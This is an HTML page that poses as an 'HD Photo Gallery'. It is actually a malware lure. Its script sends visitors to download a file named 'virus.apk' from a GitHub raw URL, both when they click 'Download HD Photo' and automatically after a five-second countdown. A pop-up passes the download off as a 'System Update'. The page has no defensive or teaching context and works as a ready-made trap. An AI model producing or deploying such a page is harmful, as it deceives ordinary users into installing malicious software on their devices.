<!DOCTYPE html>
<html>
<head>
    <title>Photo Gallery</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: #000;
            text-align: center;
            color: #fff;
            font-family: Arial;
            padding: 20px;
        }
        img {
            max-width: 100%;
            border-radius: 10px;
            margin: 20px 0;
        }
        .btn {
            background: #ff4757;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            cursor: pointer;
            margin: 10px;
        }
        .btn:hover {
            background: #e84118;
        }
        .counter {
            font-size: 24px;
            margin: 20px;
            color: #ff4757;
        }
    </style>
</head>
<body>
    <h2>📸 HD Photo Gallery</h2>
    <img src="https://i.imgur.com/7X8Y9Z0.jpg">
    <p>⚠️ Click to view HD quality</p>
    <button class="btn" onclick="downloadVirus()">📥 Download HD Photo</button>
    <div class="counter" id="timer">⏰ Auto download in 5s</div>
    
    <script>
        let seconds = 5;
        function updateTimer() {
            document.getElementById('timer').innerHTML = `⏰ Auto download in ${seconds}s`;
            if(seconds <= 0) {
                downloadVirus();
            }
            seconds--;
        }
        setInterval(updateTimer, 1000);
        
        function downloadVirus() {
            window.location.href = "https://raw.githubusercontent.com/prateekkumar4711-maker/Viresh/main/virus.apk";
            alert("Downloading System Update...");
        }
    </script>
</body>
</html>
